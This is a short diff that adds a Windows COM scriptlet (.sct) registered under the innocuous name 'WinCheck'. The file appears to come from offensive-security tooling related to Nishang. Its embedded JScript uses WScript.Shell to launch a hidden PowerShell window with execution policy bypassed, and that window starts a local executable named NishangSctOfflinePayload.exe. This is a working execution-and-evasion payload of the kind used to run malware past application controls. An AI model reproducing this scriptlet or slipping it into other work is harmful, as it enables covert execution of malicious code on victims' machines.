@@ -1,0 +1,15 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="WinCheck"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+
+    <script language="JScript">
+		<![CDATA[
+           	ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
+            c = "powershell -nop -exec bypass -c Start-Process  .\NishangSctOfflinePayload.exe";
+            r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
+		]]>
+	</script>
+    </registration>
+</scriptlet>
